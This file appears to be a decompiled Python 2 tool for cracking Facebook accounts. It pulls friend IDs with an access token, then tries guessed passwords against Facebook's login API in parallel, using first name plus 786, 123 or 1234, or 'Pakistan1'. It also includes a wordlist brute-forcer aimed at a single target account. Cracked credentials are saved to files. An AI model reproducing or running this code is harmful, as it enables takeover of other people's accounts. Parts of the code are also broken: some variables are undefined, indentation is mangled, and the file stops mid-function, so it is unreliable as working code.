# uncompyle6 version 3.7.3
# Python bytecode 2.7
# Decompiled from: Python 2.7.17 (default, Dec  5 2019, 10:47:43) 
# [GCC 4.2.1 Compatible Android (5220042 based on r346389c) Clang 8.0.7 (https://
# Embedded file name: dg
import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

def keluar():
    print '\x1b[1;91mExit'
    os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!' + w[random.randint(0, len(w) - 1)] + i

    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x = x.replace('!%s' % i, '\x1b[%s;1m' % str(31 + j))

    x += '\x1b[0m'
    x = x.replace('!0', '\x1b[0m')
    sys.stdout.write(x + '\n')


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.07)


logo = '\n   \x1b[1;31;40m__________     ________      ___       __\n   \x1b[1;32;40m___  ____/     ___  __ )     __ |     / /\n   \x1b[1;33;40m__  /_        __  __  |      __ | /| / / \n   \x1b[1;34;40m_  __/    ___  _  /_/ / ___  __ |/ |/ /  \n   \x1b[1;35;40m/_/       _(_) /_____/  _(_) ____/|__/ \x1b[1;33;40m\xea\x9c\xb0\xe1\xb4\x80\xea\x9c\xb1\xe1\xb4\x9b\xf0\x9f\x94\xa5                                             \n\n\x1b[1;31;40m \xe2\x96\x85\xe2\x96\x85\xe2\x96\x85\xe2\x96\x85\xe2\x96\x85\xe2\x96\x85\xe2\x96\x85\xe2\x96\x85\xe2\x96\x85\xe2\x96\x85\xe2\x96\x85\xe2\x96\x85\xe2\x96\x85\xe2\x96\x85\xe2\x96\x85\xe2\x96\x85\xe2\x96\x85\xe2\x96\x85\xe2\x96\x85\xe2\x96\x85\xe2\x96\x85\xe2\x96\x85\xe0\xb9\x91\xdb\xa9\xf0\x9f\x85\x95\xf0\x9f\x85\x91\xf0\x9f\x85\xa6\xdb\xa9\xe0\xb9\x91\xe2\x96\x85\xe2\x96\x85\xe2\x96\x85\xe2\x96\x85\xe2\x96\x85\xe2\x96\x85\xe2\x96\x85\xe2\x96\x85\xe2\x96\x85\xe2\x96\x85\xe2\x96\x85\xe2\x96\x85\xe2\x96\x85\xe2\x96\x85\xe2\x96\x85\xe2\x96\x85\xe2\x96\x85\xe2\x96\x85\xe2\x96\x85\xe2\x96\x85\xe2\x96\x85\xe2\x96\x85\n\x1b[1;32;40m \xe2\x9e\xa3Author\xc2\xa9  \xe2\x86\x92 Faizan Wahla\n\x1b[1;33;40m \xe2\x9e\xa3Github   \xe2\x86\x92 https://github.com/MrHackerXD\n\x1b[1;34;40m \xe2\x9e\xa3Youtube  \xe2\x86\x92 Mr Trickster\n\x1b[1;35;40m \xe2\x9e\xa3\xe2\x98\x8f        \xe2\x86\x92 +923066199314\n\x1b[1;36;40m \xe2\x96\x85\xe2\x96\x85\xe2\x96\x85\xe2\x96\x85\xe2\x96\x85\xe2\x96\x85\xe2\x96\x85\xe2\x96\x85\xe2\x96\x85\xe2\x96\x85\xe2\x96\x85\xe2\x96\x85\xe2\x96\x85\xe2\x96\x85\xe2\x96\x85\xe2\x96\x85\xe2\x96\x85\xe2\x96\x85\xe2\x96\x85\xe2\x96\x85\xe2\x96\x85\xe2\x96\x85\xe2\x96\x85\xe2\x96\x85\xe2\x96\x85\xe2\x96\x85\xe2\x96\x85\xe2\x96\x85\xe2\x96\x85\xe2\x96\x85\xe2\x96\x85\xe2\x96\x85\xe2\x96\x85\xe2\x96\x85\xe2\x96\x85\xe2\x96\x85\xe2\x96\x85\xe2\x96\x85\xe2\x96\x85\xe2\x96\x85\xe2\x96\x85\xe2\x96\x85\xe2\x96\x85\xe2\x96\x85\xe2\x96\x85\xe2\x96\x85\xe2\x96\x85\xe2\x96\x85\xe2\x96\x85\xe2\x96\x85\xe2\x96\x85\n'
logo2 = '\n\t\x1b[1;32;40m  \n\n\n\t\t\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x96\x88\xe2\x94\x80\xe2\x96\x84\xe2\x96\x80\xe2\x96\x88\xe2\x94\x80\xe2\x94\x80\xe2\x96\x88\xe2\x96\x80\xe2\x96\x84\xe2\x94\x80\xe2\x96\x88\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\n\t\t\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x96\x90\xe2\x96\x8c\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x96\x90\xe2\x96\x8c\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\n\t\t\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x96\x88\xe2\x96\x8c\xe2\x96\x80\xe2\x96\x84\xe2\x94\x80\xe2\x94\x80\xe2\x96\x84\xe2\x96\x84\xe2\x94\x80\xe2\x94\x80\xe2\x96\x84\xe2\x96\x80\xe2\x96\x90\xe2\x96\x88\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\n\t\t\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x96\x90\xe2\x96\x88\xe2\x96\x88\xe2\x94\x80\xe2\x94\x80\xe2\x96\x80\xe2\x96\x80\xe2\x94\x80\xe2\x94\x80\xe2\x96\x80\xe2\x96\x80\xe2\x94\x80\xe2\x94\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x8c\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\n\t\t\xe2\x94\x80\xe2\x94\x80\xe2\x96\x84\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x84\xe2\x94\x80\xe2\x94\x80\xe2\x96\x90\xe2\x96\x8c\xe2\x94\x80\xe2\x94\x80\xe2\x96\x84\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x84\xe2\x94\x80\xe2\x94\x80\n\n  \n'

def tik():
    titik = [
     '.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;93m\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92..99% \x1b[1;93m' + o,
        sys.stdout.flush()
        time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = '\x1b[31mNot Vuln'
vuln = '\x1b[32mVuln'
os.system('clear')

def login():
    try:
        toket = open('login.txt', 'r')
        menu()
    except (KeyError, IOError):
        os.system('clear')
        print logo2
        print ".\x1b[1;97m[1] Free Acces Tokens Are Here "
        
def tokenz():
	os.system('clear')
	print logo
	toket = raw_input("\033[1;97m[?] \033[1;97mToken\033[1;97m : Enter Acces Token Here :- ")
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		zedd = open("login.txt", 'w')
		zedd.write(toket)
		zedd.close()
		menu()
	except KeyError:
		print "\033[1;91m[!] Wrong"
		e = raw_input("\033[1;97m[?] \033[1;97mToken Invalid Refresh Page\033[1;97m[y/n]: ")
		if e =="":
			keluar()
		elif e =="y":
			login()
		else:
			keluar()

def get(data):
	print 'Generate access token '

	try:
		os.mkdir('cookie')
	except OSError:
		pass

	b = open('cookie/token.log','w')
	try:
		r = requests.get('https://api.facebook.com/restserver.php',params=data)
		a = json.loads(r.text)

		b.write(a['access_token'])
		b.close()
		print 'successfully generate access token'
		print 'Your access token is stored in cookie/token.log'
		menu()
	except KeyError:
		print 'Failed to generate access token'
		print 'Check your connection / email or password'
		os.remove('cookie/token.log')
		menu()
	except requests.exceptions.ConnectionError:
		print 'Failed to generate access token'
		print 'Connection error !!!'
		os.remove('cookie/token.log')
		menu()

    print logo2
    print '   \x1b[1;36;40m      \xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97'
    print '   \x1b[1;36;40m      \xe2\x95\x91\x1b[1;32;40m[*] Name\x1b[1;32;40m: ' + nama + '  \t   \x1b[1;36;40m\xe2\x95\x91'
    print '   \x1b[1;36;40m      \xe2\x95\x91\x1b[1;34;40m[*] ID  \x1b[1;34;40m: ' + id + '        \x1b[1;36;40m\xe2\x95\x91'
    print '   \x1b[1;36;40m      \xe2\x95\x91\x1b[1;34;40m[*] Subs\x1b[1;34;40m: ' + sub + '                      \x1b[1;36;40m\xe2\x95\x91'
    print '   \x1b[1;36;40m      \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d'
    print '\x1b[1;32;40m[1] \x1b[1;33;40mStart Cloning'
    print '\x1b[1;32;40m[2] \x1b[1;33;40mUpdate fbw'
    print '\x1b[1;32;40m[0] \x1b[1;33;40mLogout'
    pilih()


def pilih():
    unikers = raw_input('\n\x1b[1;31;40m>>> \x1b[1;35;40m')
    if unikers == '':
        print '\x1b[1;91mFill in correctly'
        pilih()
    elif unikers == '1':
        super()
    elif unikers == '2':
        os.system('clear')
        print logo
        print ' \x1b[1;36;40m\xe2\x97\x8f\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x97\x84\xe2\x96\xba\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x97\x8f\n'
        os.system('git pull origin master')
        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
        menu()
    elif unikers == '0':
        jalan('Token Removed')
        os.system('rm -rf login.txt')
        keluar()
    else:
        print '\x1b[1;91mFill in correctly'
        pilih()


def super():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91mToken invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print '\x1b[1;32;40m[1] \x1b[1;33;40mCrack From Friend List'
    print '\x1b[1;32;40m[2] \x1b[1;33;40mCrack From Public ID'
    print '\x1b[1;32;40m[3] \x1b[1;33;40mTarget Bruteforce'
    print '\x1b[1;32;40m[4] \x1b[1;33;40mCrack From File'
    print '\x1b[1;32;40m[0] \x1b[1;33;40mBack'
    pilih_super()


def pilih_super():
    global cekpoint
    global oks
    peak = raw_input('\n\x1b[1;31;40m>>> \x1b[1;97m')
    if peak == '':
        print '\x1b[1;91mFill in correctly'
        pilih_super()
    else:
        if peak == '1':
            os.system('clear')
            print logo
            jalan('\x1b[1;93m[\xe2\x9c\xba] Getting IDs \x1b[1;97m...')
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            z = json.loads(r.text)
            for s in z['data']:
                id.append(s['id'])

        elif peak == '2':
            os.system('clear')
            print logo
            idt = raw_input('\x1b[1;96m[*] Enter ID : ')
            try:
                jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                op = json.loads(jok.text)
                print '\x1b[1;31;40m[\xe2\x9c\xba] Name : ' + op['name']
            except KeyError:
                print '\x1b[1;92m[\xe2\x9c\xba] ID Not Found!'
                raw_input('\n\x1b[1;96m[\x1b[1;94mBack\x1b[1;96m]')
                super()

            print '\x1b[1;35;40m[\xe2\x9c\xba] Getting IDs...'
            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
            z = json.loads(r.text)
            for i in z['data']:
                id.append(i['id'])

        elif peak == '3':
            os.system('clear')
            print logo
            brute()
        elif peak == '4':
            os.system('clear')
            print logo
            try:
                idlist = raw_input('\x1b[1;96m[+] \x1b[1;93mEnter the file name \x1b[1;91m: \x1b[1;97m')
                for line in open(idlist, 'r').readlines():
                    id.append(line.strip())

            except IOError:
                print '\x1b[1;35;40m[!] \x1b[1;35;40mFile not found'
                raw_input('\n\x1b[1;35;40m[ \x1b[1;35;40mExit \x1b[1;35;40m]')
                super()

        elif peak == '0':
            menu()
        else:
            print '\x1b[1;91mFill in correctly'
            pilih_super()
        print '\x1b[1;36;40m[\xe2\x9c\xba] Total IDs : \x1b[1;94m' + str(len(id))
        jalan('\x1b[1;34;40m[\xe2\x9c\xba] Please Wait...')
        titik = ['.   ', '..  ', '... ']
        for o in titik:
            print '\r\x1b[1;32;40m[\xe2\x9c\xba] Cloning\x1b[1;93m' + o,
            sys.stdout.flush()
            time.sleep(1)

    print '\n\x1b[1;94m        \xe2\x9d\x88     \x1b[1;93mTo Stop Process Press CTRL+Z \x1b[1;94m    \xe2\x9d\x88'
    print ' \x1b[1;31;40m\xe2\x97\x8f\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x97\x84\xe2\x96\xba\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x97\x8f'
    jalan(' \x1b[1;93mCloning Started  Wait...')
    print '\x1b[1;36;40m \xe2\x97\x8f\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x97\x84\xe2\x96\xba\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x97\x8f'

    def main(arg):
        user = arg
        try:
            os.mkdir('out')
        except OSError:
            pass

        try:
            a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
            b = json.loads(a.text)
            pass1 = b['first_name'] + '786'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[OK] \x1b[1;92m ' + user + ' \x1b[1;94m | \x1b[1;92m ' + pass1 + ' >> ' + b['name']
                oks.append(user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;36;40m[CP] \x1b[1;97m ' + user + ' \x1b[1;36;40m|\x1b[1;97m ' + pass1 + ' >> ' + b['name']
                cek = open('out/CP.txt', 'a')
                cek.write(user + '|' + pass1 + '\n')
                cek.close()
                cekpoint.append(user + pass1)
            else:
                pass2 = b['first_name'] + '123'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;92m[OK] \x1b[1;92m ' + user + ' \x1b[1;92m | \x1b[1;92m ' + pass2 + ' >> ' + b['name']
                    oks.append(user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;36;40m[CP] \x1b[1;97m ' + user + ' \x1b[1;36;40m|\x1b[1;97m ' + pass2 + ' >> ' + b['name']
                    cek = open('out/CP.txt', 'a')
                    cek.write(user + '|' + pass2 + '\n')
                    cek.close()
                    cekpoint.append(user + pass2)
                else:
                    pass3 = b['first_name'] + '12345'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;92m[OK] \x1b[1;92m ' + user + ' \x1b[1;92m | \x1b[1;92m ' + pass3 + ' >> ' + b['name']
                        oks.append(user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;36;40m[CP] \x1b[1;97m ' + user + ' \x1b[1;36;40m|\x1b[1;97m ' + pass3 + ' >> ' + b['name']
                        cek = open('out/CP.txt', 'a')
                        cek.write(user + '|' + pass3 + '\n')
                        cek.close()
                        cekpoint.append(user + pass4)
                    else:
                        pass4 = b['first_name'] + '1234'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        q = json.load(data)
                        if 'access_token' in q:
                            print '\x1b[1;92m[OK] \x1b[1;92m ' + user + ' \x1b[1;92m | \x1b[1;92m ' + pass4 + ' >> ' + b['name']
                            oks.append(user + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;36;40m[CP] \x1b[1;97m ' + user + ' \x1b[1;36;40m|\x1b[1;97m ' + pass4 + ' >> ' + b['name']
                            cek = open('out/CP.txt', 'a')
                            cek.write(user + '|' + pass4 + '\n')
                            cek.close()
                            cekpoint.append(user + pass4)
                        else:
                            pass5 = '786786'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;92m[OK] \x1b[1;92m ' + user + ' \x1b[1;36;40m|\x1b[1;92m ' + pass5 + ' >> ' + b['name']
                                oks.append(user + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print '\x1b[1;36;40m[CP] \x1b[1;97m ' + user + ' \x1b[1;36;40m|\x1b[1;97m ' + pass5 + ' >> ' + b['name']
                                cek = open('out/CP.txt', 'a')
                                cek.write(user + '|' + pass5 + '\n')
                                cek.close()
                                cekpoint.append(user + pass5)
                            else:
                                pass6 = 'Pakistan1'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                q = json.load(data)
                                if 'access_token' in q:
                                    print '\x1b[1;92m[OK] \x1b[1;92m ' + user + ' \x1b[1;36;40m|\x1b[1;92m ' + pass6 + ' >> ' + b['name']
                                    oks.append(user + pass6)
                                elif 'www.facebook.com' in q['error_msg']:
                                    print '\x1b[1;36;40m[CP] \x1b[1;97m ' + user + ' \x1b[1;36;40m|\x1b[1;97m ' + pass6 + ' >> ' + b['name']
                                    cek = open('out/CP.txt', 'a')
                                    cek.write(user + '|' + pass6 + '\n')
                                    cek.close()
                                    cekpoint.append(user + pass6)
                                else:
                                    pass7 = 'Pakistan'
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;92m[OK] \x1b[1;92m ' + user + ' \x1b[1;36;40m|\x1b[1;92m ' + pass7 + ' >> ' + b['name']
                                        oks.append(user + pass7)
                                    elif 'www.facebook.com' in q['error_msg']:
                                        print '\x1b[1;36;40m[CP] \x1b[1;97m ' + user + ' \x1b[1;36;40m|\x1b[1;97m ' + pass7 + ' >> ' + b['name']
                                        cek = open('out/CP.txt', 'a')
                                        cek.write(user + '|' + pass7 + '\n')
                                        cek.close()
                                        cekpoint.append(user + pass7)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\x1b[1;31;40m[\xe2\x9c\x93] Process Has Been Completed\x1b[1;96m....'
    print '\x1b[1;32;40m[+] Total OK/\x1b[1;93mCP \x1b[1;91m: \x1b[1;91m' + str(len(oks)) + '\x1b[1;31;40m/\x1b[1;36;40m' + str(len(cekpoint))
    print '\x1b[1;34;40m[+] CP File Has Been Saved : save/cp.txt'
    print '\n\n\n\x1b[1;31;40m \xe2\x97\x8f\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x97\x84\xe2\x96\xba\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x97\x8f\n           '
    raw_input('\n\x1b[1;96m[\x1b[1;97mExit\x1b[1;96m]')
    super()


def brute():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.5)
        login()
    else:
        os.system('clear')
        print logo
        print '\x1b[1;31;40m \xe2\x97\x8f\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x97\x84\xe2\x96\xba\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x97\x8f'
        try:
            email = raw_input('\x1b[1;91m[+] \x1b[1;92mID\x1b[1;97m/\x1b[1;92mEmail \x1b[1;97mTarget \x1b[1;91m:\x1b[1;97m ')
            passw = raw_input('\x1b[1;91m[+] \x1b[1;92mWordlist \x1b[1;97mext(list.txt) \x1b[1;91m: \x1b[1;97m')
            total = open(passw, 'r')
            total = total.readlines()
            print '\x1b[1;31;40m \xe2\x97\x8f\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x97\x84\xe2\x96\xba\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x97\x8f'
            print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mTarget \x1b[1;91m:\x1b[1;97m ' + email
            print '\x1b[1;91m[+] \x1b[1;92mTotal\x1b[1;96m ' + str(len(total)) + ' \x1b[1;92mPassword'
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
            sandi = open(passw, 'r')
            for pw in sandi:
                try:
                    pw = pw.replace('\n', '')
                    sys.stdout.write('\r\x1b[1;91m[\x1b[1;96m\xe2\x9c\xb8\x1b[1;91m] \x1b[1;92mTry \x1b[1;97m' + pw)
                    sys.stdout.flush()
                    data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + email + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    mpsh = json.loads(data.text)
                    if 'access_token' in mpsh:
                        dapat = open('Brute.txt', 'w')
                        dapat.write(email + ' | ' + pw + '\n')
                        dapat.close()
                        print '\n\x1b[1;91m[+] \x1b[1;92mFounded.'
                        print 52 * '\x1b[1;97m\xe2\x95\x90'
